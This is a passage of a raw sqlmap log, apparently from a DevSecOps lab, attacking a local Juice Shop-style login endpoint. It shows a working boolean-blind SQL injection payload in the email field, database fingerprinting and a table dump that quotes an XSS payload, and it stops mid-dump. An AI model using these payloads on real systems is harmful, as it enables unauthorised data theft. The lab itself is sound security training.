@@ -1,0 +1,2713 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.8.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 11:48:49 /2026-05-08/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[11:48:49] [WARNING] using '/home/nodo/DevSecOps/DevSecOps-Intro/labs/lab5/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:3000/rest/user/login
+POST data: {"email":"*","password":"test"}
+do you want to test this URL? [Y/n/q]
+> Y
+[11:48:49] [INFO] testing URL 'http://localhost:3000/rest/user/login'
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[11:48:49] [INFO] using '/home/nodo/DevSecOps/DevSecOps-Intro/labs/lab5/sqlmap/results-05082026_1148am.csv' as the CSV results file in multiple targets mode
+[11:48:49] [INFO] testing connection to the target URL
+[11:48:49] [INFO] checking if the target is protected by some kind of WAF/IPS
+[11:48:49] [INFO] testing if the target URL content is stable
+[11:48:50] [INFO] target URL content is stable
+[11:48:50] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
+[11:48:50] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
+[11:48:50] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
+[11:48:50] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
+[11:48:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:48:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[11:48:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[11:48:54] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --code=401)
+[11:48:54] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[11:48:54] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+[11:49:42] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+[11:49:42] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+[11:50:28] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+[11:50:28] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[11:50:28] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
+(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 231 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"email":"' OR NOT 3202=3202-- Ivzx","password":"test"}
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[11:50:28] [INFO] testing SQLite
+[11:50:29] [INFO] confirming SQLite
+[11:50:29] [INFO] actively fingerprinting SQLite
+[11:50:29] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[11:50:29] [INFO] fetching tables for database: 'SQLite_masterdb'
+[11:50:29] [INFO] fetching number of tables for database 'SQLite_masterdb'
+
+[11:50:29] [INFO] retrieved: 21
+[11:50:29] [INFO] retrieving the length of query output
+
+[11:50:29] [INFO] retrieved: 5
+[11:50:29] [INFO] retrieved: _____
+[11:50:29] [INFO] retrieved: 
+[11:50:29] [INFO] retrieved: Users           
+[11:50:30] [INFO] retrieved: Users
+[11:50:30] [INFO] retrieving the length of query output
+
+[11:50:30] [INFO] retrieved: 15
+[11:50:30] [INFO] retrieved: _______________
+[11:50:30] [INFO] retrieved: 
+[11:50:32] [INFO] retrieved: sqlite_sequence             
+[11:50:32] [INFO] retrieved: sqlite_sequence
+[11:50:32] [INFO] retrieving the length of query output
+
+[11:50:32] [INFO] retrieved: 9
+[11:50:32] [INFO] retrieved: _________
+[11:50:32] [INFO] retrieved: 
+[11:50:33] [INFO] retrieved: Addresses           
+[11:50:33] [INFO] retrieved: Addresses
+[11:50:33] [INFO] retrieving the length of query output
+
+[11:50:33] [INFO] retrieved: 7
+[11:50:33] [INFO] retrieved: _______
+[11:50:33] [INFO] retrieved: 
+[11:50:34] [INFO] retrieved: Baskets           
+[11:50:34] [INFO] retrieved: Baskets
+[11:50:34] [INFO] retrieving the length of query output
+
+[11:50:34] [INFO] retrieved: 8
+[11:50:34] [INFO] retrieved: ________
+[11:50:34] [INFO] retrieved: 
+[11:50:35] [INFO] retrieved: Products           
+[11:50:35] [INFO] retrieved: Products
+[11:50:35] [INFO] retrieving the length of query output
+
+[11:50:35] [INFO] retrieved: 11
+[11:50:35] [INFO] retrieved: ___________
+[11:50:35] [INFO] retrieved: 
+[11:50:39] [INFO] retrieved: BasketItems             
+[11:50:39] [INFO] retrieved: BasketItems
+[11:50:39] [INFO] retrieving the length of query output
+
+[11:50:39] [INFO] retrieved: 8
+[11:50:39] [INFO] retrieved: ________
+[11:50:39] [INFO] retrieved: 
+[11:50:40] [INFO] retrieved: Captchas           
+[11:50:40] [INFO] retrieved: Captchas
+[11:50:40] [INFO] retrieving the length of query output
+
+[11:50:40] [INFO] retrieved: 5
+[11:50:40] [INFO] retrieved: _____
+[11:50:40] [INFO] retrieved: 
+[11:50:41] [INFO] retrieved: Cards           
+[11:50:41] [INFO] retrieved: Cards
+[11:50:41] [INFO] retrieving the length of query output
+
+[11:50:41] [INFO] retrieved: 10
+[11:50:41] [INFO] retrieved: __________
+[11:50:41] [INFO] retrieved: 
+[11:50:42] [INFO] retrieved: Challenges             
+[11:50:42] [INFO] retrieved: Challenges
+[11:50:42] [INFO] retrieving the length of query output
+
+[11:50:42] [INFO] retrieved: 10
+[11:50:43] [INFO] retrieved: __________
+[11:50:43] [INFO] retrieved: 
+[11:50:44] [INFO] retrieved: Complaints             
+[11:50:44] [INFO] retrieved: Complaints
+[11:50:44] [INFO] retrieving the length of query output
+
+[11:50:44] [INFO] retrieved: 10
+[11:50:44] [INFO] retrieved: __________
+[11:50:44] [INFO] retrieved: 
+[11:50:45] [INFO] retrieved: Deliveries             
+[11:50:45] [INFO] retrieved: Deliveries
+[11:50:45] [INFO] retrieving the length of query output
+
+[11:50:45] [INFO] retrieved: 9
+[11:50:46] [INFO] retrieved: _________
+[11:50:46] [INFO] retrieved: 
+[11:50:47] [INFO] retrieved: Feedbacks           
+[11:50:47] [INFO] retrieved: Feedbacks
+[11:50:47] [INFO] retrieving the length of query output
+
+[11:50:47] [INFO] retrieved: 5
+[11:50:47] [INFO] retrieved: _____
+[11:50:47] [INFO] retrieved: 
+[11:50:47] [INFO] retrieved: Hints           
+[11:50:47] [INFO] retrieved: Hints
+[11:50:47] [INFO] retrieving the length of query output
+
+[11:50:47] [INFO] retrieved: 13
+[11:50:48] [INFO] retrieved: _____________
+[11:50:48] [INFO] retrieved: 
+[11:50:49] [INFO] retrieved: ImageCaptchas             
+[11:50:49] [INFO] retrieved: ImageCaptchas
+[11:50:49] [INFO] retrieving the length of query output
+
+[11:50:49] [INFO] retrieved: 8
+[11:50:49] [INFO] retrieved: ________
+[11:50:49] [INFO] retrieved: 
+[11:50:50] [INFO] retrieved: Memories           
+[11:50:50] [INFO] retrieved: Memories
+[11:50:50] [INFO] retrieving the length of query output
+
+[11:50:50] [INFO] retrieved: 15
+[11:50:50] [INFO] retrieved: _______________
+[11:50:50] [INFO] retrieved: 
+[11:50:52] [INFO] retrieved: PrivacyRequests             
+[11:50:52] [INFO] retrieved: PrivacyRequests
+[11:50:52] [INFO] retrieving the length of query output
+
+[11:50:52] [INFO] retrieved: 10
+[11:50:52] [INFO] retrieved: __________
+[11:50:52] [INFO] retrieved: 
+[11:50:53] [INFO] retrieved: Quantities             
+[11:50:54] [INFO] retrieved: Quantities
+[11:50:54] [INFO] retrieving the length of query output
+
+[11:50:54] [INFO] retrieved: 8
+[11:50:54] [INFO] retrieved: ________
+[11:50:54] [INFO] retrieved: 
+[11:50:55] [INFO] retrieved: Recycles           
+[11:50:55] [INFO] retrieved: Recycles
+[11:50:55] [INFO] retrieving the length of query output
+
+[11:50:55] [INFO] retrieved: 17
+[11:50:55] [INFO] retrieved: _________________
+[11:50:55] [INFO] retrieved: 
+[11:50:57] [INFO] retrieved: SecurityQuestions             
+[11:50:57] [INFO] retrieved: SecurityQuestions
+[11:50:57] [INFO] retrieving the length of query output
+
+[11:50:57] [INFO] retrieved: 15
+[11:50:57] [INFO] retrieved: _______________
+[11:50:57] [INFO] retrieved: 
+[11:50:59] [INFO] retrieved: SecurityAnswers             
+[11:50:59] [INFO] retrieved: SecurityAnswers
+[11:50:59] [INFO] retrieving the length of query output
+
+[11:50:59] [INFO] retrieved: 7
+[11:50:59] [INFO] retrieved: _______
+[11:50:59] [INFO] retrieved: 
+[11:51:00] [INFO] retrieved: Wallets           
+[11:51:00] [INFO] retrieved: Wallets
+[11:51:00] [INFO] retrieving the length of query output
+
+[11:51:00] [INFO] retrieved: 425
+[11:51:00] [INFO] retrieved: __________________________________
+[11:51:00] [INFO] retrieved: 
+[11:51:54] [INFO] retrieved: ..L, `updatedAt` DATETIME NOT NULL)               
+[11:51:54] [INFO] retrieved: CREATE TABLE `Challenges` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `key` TEXT, `name` VARCHAR(255), `category` VARCHAR(255), `tags` VARCHAR(255), `description` VARCHAR(255), `difficulty` INTEGER, `mitigationUrl` VARCHAR(255), `solved` TINYINT(1), `disabledEnv` VARCHAR(255), `tutorialOrder` NUMBER, `codingChallengeStatus` NUMBER, `hasCodingChallenge` TINYINT(1), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)
+[11:51:54] [INFO] fetching entries for table 'Challenges'
+[11:51:54] [INFO] fetching number of entries for table 'Challenges' in database 'SQLite_masterdb'
+
+[11:51:54] [INFO] retrieved: 110
+[11:51:54] [INFO] retrieving the length of query output
+
+[11:51:54] [INFO] retrieved: 3
+[11:51:54] [INFO] retrieved: ___
+[11:51:54] [INFO] retrieved: 
+[11:51:55] [INFO] retrieved: XSS           
+[11:51:55] [INFO] retrieved: XSS
+[11:51:55] [INFO] retrieving the length of query output
+
+[11:51:55] [INFO] retrieved: 1
+
+[11:51:55] [INFO] retrieved: 0
+[11:51:55] [INFO] retrieving the length of query output
+
+[11:51:55] [INFO] retrieved: 30
+[11:51:55] [INFO] retrieved: ______________________________
+[11:51:55] [INFO] retrieved: 
+[11:51:59] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00             
+[11:51:59] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00
+[11:51:59] [INFO] retrieving the length of query output
+
+[11:51:59] [INFO] retrieved: 224
+[11:51:59] [INFO] retrieved: __________________________________
+[11:51:59] [INFO] retrieved: 
+[11:52:28] [INFO] retrieved: ..harmful</strong> on Docker!)</em>               
+[11:52:28] [INFO] retrieved: Perform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> without using the frontend application at all. <em>(This challenge is <strong>potentially harmful</strong> on Docker!)</em>
+[11:52:28] [INFO] retrieving the length of query output
+
+[11:52:28] [INFO] retrieved: 1
+
+[11:52:28] [INFO] retrieved: 3
+[11:52:28] [INFO] retrieving the length of query output
+
+[11:52:28] [INFO] retrieved: 6
+[11:52:28] [INFO] retrieved: ______
+[11:52:28] [INFO] retrieved: 
+[11:52:29] [INFO] retrieved: Docker           
+[11:52:29] [INFO] retrieved: Docker
+[11:52:29] [INFO] retrieving the length of query output
+
+[11:52:29] [INFO] retrieved: 1
+
+[11:52:29] [INFO] retrieved: 1
+[11:52:29] [INFO] retrieving the length of query output
+
+[11:52:29] [INFO] retrieved: 1
+
+[11:52:29] [INFO] retrieved: 1
+[11:52:29] [INFO] retrieving the length of query output
+
+[11:52:29] [INFO] retrieved: 19
+[11:52:30] [INFO] retrieved: ___________________
+[11:52:30] [INFO] retrieved: 
+[11:52:32] [INFO] retrieved: restfulXssChallenge             
+[11:52:38] [INFO] retrieved: restfulXssChallenge
+[11:52:38] [INFO] retrieving the length of query output
+
+[11:52:38] [INFO] retrieved: 95
+[11:52:38] [INFO] retrieved: __________________________________
+[11:52:38] [INFO] retrieved: 
+[11:52:48] [INFO] retrieved: ..pting_Prevention_Cheat_Sheet.html             
+[11:52:48] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+[11:52:48] [INFO] retrieving the length of query output
+
+[11:52:48] [INFO] retrieved: 12
+[11:52:48] [INFO] retrieved: ____________
+[11:52:48] [INFO] retrieved: 
+[11:52:50] [INFO] retrieved: API-only XSS             
+[11:52:50] [INFO] retrieved: API-only XSS
+[11:52:50] [INFO] retrieving the length of query output
+
+[11:52:50] [INFO] retrieved: 1
+
+[11:52:50] [INFO] retrieved: 0
+[11:52:50] [INFO] retrieving the length of query output
+
+[11:52:50] [INFO] retrieved: 33
+[11:52:50] [INFO] retrieved: _________________________________
+[11:52:50] [INFO] retrieved: 
+[11:52:54] [INFO] retrieved: Danger Zone,With Coding Challenge             
+[11:52:54] [INFO] retrieved: Danger Zone,With Coding Challenge
+[11:52:54] [INFO] retrieving the length of query output
+
+[11:52:54] [INFO] retrieved:  
+
+[11:52:54] [INFO] retrieved:  
+[11:52:54] [INFO] retrieving the length of query output
+
+[11:52:54] [INFO] retrieved: 30
+[11:52:54] [INFO] retrieved: ______________________________
+[11:52:54] [INFO] retrieved: 
+[11:53:00] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00             
+[11:53:00] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00
+[11:53:00] [INFO] retrieving the length of query output
+
+[11:53:00] [INFO] retrieved: 23
+[11:53:01] [INFO] retrieved: _______________________
+[11:53:01] [INFO] retrieved: 
+[11:53:03] [INFO] retrieved: Sensitive Data Exposure             
+[11:53:03] [INFO] retrieved: Sensitive Data Exposure
+[11:53:03] [INFO] retrieving the length of query output
+
+[11:53:03] [INFO] retrieved: 1
+
+[11:53:03] [INFO] retrieved: 0
+[11:53:03] [INFO] retrieving the length of query output
+
+[11:53:03] [INFO] retrieved: 30
+[11:53:03] [INFO] retrieved: ______________________________
+[11:53:03] [INFO] retrieved: 
+[11:53:07] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00             
+[11:53:07] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00
+[11:53:07] [INFO] retrieving the length of query output
+
+[11:53:07] [INFO] retrieved: 49
+[11:53:07] [INFO] retrieved: __________________________________
+[11:53:07] [INFO] retrieved: 
+[11:53:12] [INFO] retrieved: ..ny access log file of the server.             
+[11:53:12] [INFO] retrieved: Gain access to any access log file of the server.
+[11:53:12] [INFO] retrieving the length of query output
+
+[11:53:12] [INFO] retrieved: 1
+
+[11:53:12] [INFO] retrieved: 4
+[11:53:12] [INFO] retrieving the length of query output
+
+[11:53:12] [INFO] retrieved:  
+
+[11:53:12] [INFO] retrieved:  
+[11:53:13] [INFO] retrieving the length of query output
+
+[11:53:13] [INFO] retrieved: 1
+
+[11:53:13] [INFO] retrieved: 1
+[11:53:13] [INFO] retrieving the length of query output
+
+[11:53:13] [INFO] retrieved: 1
+
+[11:53:13] [INFO] retrieved: 2
+[11:53:13] [INFO] retrieving the length of query output
+
+[11:53:13] [INFO] retrieved: 28
+[11:53:13] [INFO] retrieved: ____________________________
+[11:53:13] [INFO] retrieved: 
+[11:53:16] [INFO] retrieved: accessLogDisclosureChallenge             
+[11:53:16] [INFO] retrieved: accessLogDisclosureChallenge
+[11:53:16] [INFO] retrieving the length of query output
+
+[11:53:16] [INFO] retrieved: 71
+[11:53:17] [INFO] retrieved: __________________________________
+[11:53:17] [INFO] retrieved: 
+[11:53:24] [INFO] retrieved: ..atsheets/Logging_Cheat_Sheet.html             
+[11:53:24] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+[11:53:24] [INFO] retrieving the length of query output
+
+[11:53:24] [INFO] retrieved: 10
+[11:53:24] [INFO] retrieved: __________
+[11:53:24] [INFO] retrieved: 
+[11:53:25] [INFO] retrieved: Access Log             
+[11:53:25] [INFO] retrieved: Access Log
+[11:53:25] [INFO] retrieving the length of query output
+
+[11:53:25] [INFO] retrieved: 1
+
+[11:53:25] [INFO] retrieved: 0
+[11:53:25] [INFO] retrieving the length of query output
+
+[11:53:25] [INFO] retrieved: 21
+[11:53:25] [INFO] retrieved: _____________________
+[11:53:25] [INFO] retrieved: 
+[11:53:27] [INFO] retrieved: With Coding Challenge             
+[11:53:27] [INFO] retrieved: With Coding Challenge
+[11:53:27] [INFO] retrieving the length of query output
+
+[11:53:27] [INFO] retrieved:  
+
+[11:53:27] [INFO] retrieved:  
+[11:53:28] [INFO] retrieving the length of query output
+
+[11:53:28] [INFO] retrieved: 30
+[11:53:28] [INFO] retrieved: ______________________________
+[11:53:28] [INFO] retrieved: 
+[11:53:31] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00             
+[11:53:31] [INFO] retrieved: 2026-05-08 08:29:59.464 +00:00
+[11:53:31] [INFO] retrieving the length of query output
+
+[11:53:31] [INFO] retrieved: 25
+[11:53:34] [INFO] retrieved: _________________________
+[11:53:34] [INFO] retrieved: 
+[11:53:37] [INFO] retrieved: Improper Input Validation             
+[11:53:37] [INFO] retrieved: Improper Input Validation
+[11:53:37] [INFO] retrieving the length of query output
+
+[11:53:37] [INFO] retrieved: 1
+
+[11:53:37] [INFO] retrieved: 0
+[11:53:37] [INFO] retrieving the length of query output
+
+[11:53:37] [INFO] retrieved: 30
+[11:53:37] [INFO] retrieved: ______________________________
+[11:53:37] [INFO] retrieved: 
+[11:53:41] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:53:41] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:53:41] [INFO] retrieving the length of query output
+
+[11:53:41] [INFO] retrieved: 49
+[11:53:41] [INFO] retrieved: __________________________________
+[11:53:41] [INFO] retrieved: 
+[11:53:46] [INFO] retrieved: ..er with administrator privileges.             
+[11:53:46] [INFO] retrieved: Register as a user with administrator privileges.
+[11:53:46] [INFO] retrieving the length of query output
+
+[11:53:46] [INFO] retrieved: 1
+
+[11:53:46] [INFO] retrieved: 3
+[11:53:46] [INFO] retrieving the length of query output
+
+[11:53:46] [INFO] retrieved:  
+
+[11:53:46] [INFO] retrieved:  
+[11:53:47] [INFO] retrieving the length of query output
+
+[11:53:47] [INFO] retrieved: 1
+
+[11:53:47] [INFO] retrieved: 1
+[11:53:47] [INFO] retrieving the length of query output
+
+[11:53:47] [INFO] retrieved: 1
+
+[11:53:47] [INFO] retrieved: 3
+[11:53:47] [INFO] retrieving the length of query output
+
+[11:53:47] [INFO] retrieved: 22
+[11:53:47] [INFO] retrieved: ______________________
+[11:53:47] [INFO] retrieved: 
+[11:53:49] [INFO] retrieved: registerAdminChallenge             
+[11:53:50] [INFO] retrieved: registerAdminChallenge
+[11:53:50] [INFO] retrieving the length of query output
+
+[11:53:50] [INFO] retrieved: 79
+[11:53:50] [INFO] retrieved: __________________________________
+[11:53:50] [INFO] retrieved: 
+[11:53:58] [INFO] retrieved: ../Mass_Assignment_Cheat_Sheet.html             
+[11:53:58] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
+[11:53:58] [INFO] retrieving the length of query output
+
+[11:53:58] [INFO] retrieved: 18
+[11:53:58] [INFO] retrieved: __________________
+[11:53:58] [INFO] retrieved: 
+[11:54:00] [INFO] retrieved: Admin Registration             
+[11:54:00] [INFO] retrieved: Admin Registration
+[11:54:00] [INFO] retrieving the length of query output
+
+[11:54:00] [INFO] retrieved: 1
+
+[11:54:00] [INFO] retrieved: 0
+[11:54:00] [INFO] retrieving the length of query output
+
+[11:54:00] [INFO] retrieved: 21
+[11:54:00] [INFO] retrieved: _____________________
+[11:54:00] [INFO] retrieved: 
+[11:54:02] [INFO] retrieved: With Coding Challenge             
+[11:54:02] [INFO] retrieved: With Coding Challenge
+[11:54:02] [INFO] retrieving the length of query output
+
+[11:54:02] [INFO] retrieved:  
+
+[11:54:02] [INFO] retrieved:  
+[11:54:03] [INFO] retrieving the length of query output
+
+[11:54:03] [INFO] retrieved: 30
+[11:54:03] [INFO] retrieved: ______________________________
+[11:54:03] [INFO] retrieved: 
+[11:54:06] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:54:06] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:54:06] [INFO] retrieving the length of query output
+
+[11:54:06] [INFO] retrieved: 21
+[11:54:06] [INFO] retrieved: _____________________
+[11:54:06] [INFO] retrieved: 
+[11:54:11] [INFO] retrieved: Broken Access Control             
+[11:54:11] [INFO] retrieved: Broken Access Control
+[11:54:11] [INFO] retrieving the length of query output
+
+[11:54:11] [INFO] retrieved: 1
+
+[11:54:11] [INFO] retrieved: 0
+[11:54:12] [INFO] retrieving the length of query output
+
+[11:54:12] [INFO] retrieved: 30
+[11:54:12] [INFO] retrieved: ______________________________
+[11:54:12] [INFO] retrieved: 
+[11:54:16] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:54:16] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:54:16] [INFO] retrieving the length of query output
+
+[11:54:16] [INFO] retrieved: 47
+[11:54:16] [INFO] retrieved: __________________________________
+[11:54:16] [INFO] retrieved: 
+[11:54:21] [INFO] retrieved: ..inistration section of the store.             
+[11:54:21] [INFO] retrieved: Access the administration section of the store.
+[11:54:21] [INFO] retrieving the length of query output
+
+[11:54:21] [INFO] retrieved: 1
+
+[11:54:21] [INFO] retrieved: 2
+[11:54:21] [INFO] retrieving the length of query output
+
+[11:54:21] [INFO] retrieved:  
+
+[11:54:21] [INFO] retrieved:  
+[11:54:21] [INFO] retrieving the length of query output
+
+[11:54:21] [INFO] retrieved: 1
+
+[11:54:21] [INFO] retrieved: 1
+[11:54:21] [INFO] retrieving the length of query output
+
+[11:54:21] [INFO] retrieved: 1
+
+[11:54:21] [INFO] retrieved: 4
+[11:54:22] [INFO] retrieving the length of query output
+
+[11:54:22] [INFO] retrieved: 21
+[11:54:22] [INFO] retrieved: _____________________
+[11:54:22] [INFO] retrieved: 
+[11:54:24] [INFO] retrieved: adminSectionChallenge             
+[11:54:24] [INFO] retrieved: adminSectionChallenge
+[11:54:24] [INFO] retrieving the length of query output
+
+[11:54:24] [INFO] retrieved: 77
+[11:54:24] [INFO] retrieved: __________________________________
+[11:54:24] [INFO] retrieved: 
+[11:54:32] [INFO] retrieved: ..ts/Authorization_Cheat_Sheet.html             
+[11:54:32] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
+[11:54:32] [INFO] retrieving the length of query output
+
+[11:54:32] [INFO] retrieved: 13
+[11:54:32] [INFO] retrieved: _____________
+[11:54:32] [INFO] retrieved: 
+[11:54:33] [INFO] retrieved: Admin Section             
+[11:54:33] [INFO] retrieved: Admin Section
+[11:54:33] [INFO] retrieving the length of query output
+
+[11:54:33] [INFO] retrieved: 1
+
+[11:54:34] [INFO] retrieved: 0
+[11:54:34] [INFO] retrieving the length of query output
+
+[11:54:34] [INFO] retrieved: 36
+[11:54:34] [INFO] retrieved: __________________________________
+[11:54:34] [INFO] retrieved: 
+[11:54:37] [INFO] retrieved: ..d for Demos,With Coding Challenge             
+[11:54:38] [INFO] retrieved: Good for Demos,With Coding Challenge
+[11:54:38] [INFO] retrieving the length of query output
+
+[11:54:38] [INFO] retrieved: 1
+
+[11:54:38] [INFO] retrieved: 8
+[11:54:38] [INFO] retrieving the length of query output
+
+[11:54:38] [INFO] retrieved: 30
+[11:54:38] [INFO] retrieved: ______________________________
+[11:54:38] [INFO] retrieved: 
+[11:54:42] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:54:45] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:54:45] [INFO] retrieving the length of query output
+
+[11:54:45] [INFO] retrieved: 21
+[11:54:45] [INFO] retrieved: _____________________
+[11:54:45] [INFO] retrieved: 
+[11:54:47] [INFO] retrieved: Vulnerable Components             
+[11:54:47] [INFO] retrieved: Vulnerable Components
+[11:54:47] [INFO] retrieving the length of query output
+
+[11:54:47] [INFO] retrieved: 1
+
+[11:54:47] [INFO] retrieved: 0
+[11:54:47] [INFO] retrieving the length of query output
+
+[11:54:47] [INFO] retrieved: 30
+[11:54:47] [INFO] retrieved: ______________________________
+[11:54:47] [INFO] retrieved: 
+[11:54:51] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:54:51] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:54:51] [INFO] retrieving the length of query output
+
+[11:54:51] [INFO] retrieved: 142
+[11:54:51] [INFO] retrieved: __________________________________
+[11:54:51] [INFO] retrieved: 
+[11:55:06] [INFO] retrieved: ..harmful</strong> on Docker!)</em>               
+[11:55:06] [INFO] retrieved: Overwrite the <a href="/ftp/legal.md">Legal Information</a> file. <em>(This challenge is <strong>potentially harmful</strong> on Docker!)</em>
+[11:55:06] [INFO] retrieving the length of query output
+
+[11:55:06] [INFO] retrieved: 1
+
+[11:55:06] [INFO] retrieved: 6
+[11:55:06] [INFO] retrieving the length of query output
+
+[11:55:06] [INFO] retrieved: 6
+[11:55:06] [INFO] retrieved: ______
+[11:55:06] [INFO] retrieved: 
+[11:55:07] [INFO] retrieved: Docker           
+[11:55:07] [INFO] retrieved: Docker
+[11:55:07] [INFO] retrieving the length of query output
+
+[11:55:07] [INFO] retrieved: 1
+
+[11:55:07] [INFO] retrieved: 0
+[11:55:07] [INFO] retrieving the length of query output
+
+[11:55:07] [INFO] retrieved: 1
+
+[11:55:07] [INFO] retrieved: 5
+[11:55:07] [INFO] retrieving the length of query output
+
+[11:55:07] [INFO] retrieved: 18
+[11:55:08] [INFO] retrieved: __________________
+[11:55:08] [INFO] retrieved: 
+[11:55:09] [INFO] retrieved: fileWriteChallenge             
+[11:55:10] [INFO] retrieved: fileWriteChallenge
+[11:55:10] [INFO] retrieving the length of query output
+
+[11:55:10] [INFO] retrieved: 96
+[11:55:10] [INFO] retrieved: __________________________________
+[11:55:10] [INFO] retrieved: 
+[11:55:23] [INFO] retrieved: ..dency_Management_Cheat_Sheet.html             
+[11:55:23] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html
+[11:55:23] [INFO] retrieving the length of query output
+
+[11:55:23] [INFO] retrieved: 20
+[11:55:23] [INFO] retrieved: ____________________
+[11:55:23] [INFO] retrieved: 
+[11:55:25] [INFO] retrieved: Arbitrary File Write             
+[11:55:25] [INFO] retrieved: Arbitrary File Write
+[11:55:25] [INFO] retrieving the length of query output
+
+[11:55:25] [INFO] retrieved: 1
+
+[11:55:25] [INFO] retrieved: 0
+[11:55:25] [INFO] retrieving the length of query output
+
+[11:55:25] [INFO] retrieved: 24
+[11:55:26] [INFO] retrieved: ________________________
+[11:55:26] [INFO] retrieved: 
+[11:55:28] [INFO] retrieved: Danger Zone,Prerequisite             
+[11:55:28] [INFO] retrieved: Danger Zone,Prerequisite
+[11:55:28] [INFO] retrieving the length of query output
+
+[11:55:28] [INFO] retrieved:  
+
+[11:55:28] [INFO] retrieved:  
+[11:55:28] [INFO] retrieving the length of query output
+
+[11:55:28] [INFO] retrieved: 30
+[11:55:29] [INFO] retrieved: ______________________________
+[11:55:29] [INFO] retrieved: 
+[11:55:32] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:55:32] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:55:32] [INFO] retrieving the length of query output
+
+[11:55:32] [INFO] retrieved: 21
+[11:55:32] [INFO] retrieved: _____________________
+[11:55:32] [INFO] retrieved: 
+[11:55:34] [INFO] retrieved: Broken Authentication             
+[11:55:34] [INFO] retrieved: Broken Authentication
+[11:55:34] [INFO] retrieving the length of query output
+
+[11:55:34] [INFO] retrieved: 1
+
+[11:55:35] [INFO] retrieved: 0
+[11:55:35] [INFO] retrieving the length of query output
+
+[11:55:35] [INFO] retrieved: 30
+[11:55:35] [INFO] retrieved: ______________________________
+[11:55:35] [INFO] retrieved: 
+[11:55:38] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:55:38] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:55:38] [INFO] retrieving the length of query output
+
+[11:55:38] [INFO] retrieved: 169
+[11:55:38] [INFO] retrieved: __________________________________
+[11:55:38] [INFO] retrieved: 
+[11:55:59] [INFO] retrieved: ..wer</i> to his security question.               
+[11:55:59] [INFO] retrieved: Reset the password of Bjoern's OWASP account via the <a href="/#/forgot-password">Forgot Password</a> mechanism with <i>the original answer</i> to his security question.
+[11:55:59] [INFO] retrieving the length of query output
+
+[11:55:59] [INFO] retrieved: 1
+
+[11:55:59] [INFO] retrieved: 3
+[11:55:59] [INFO] retrieving the length of query output
+
+[11:55:59] [INFO] retrieved:  
+
+[11:55:59] [INFO] retrieved:  
+[11:56:00] [INFO] retrieving the length of query output
+
+[11:56:00] [INFO] retrieved: 1
+
+[11:56:00] [INFO] retrieved: 1
+[11:56:00] [INFO] retrieving the length of query output
+
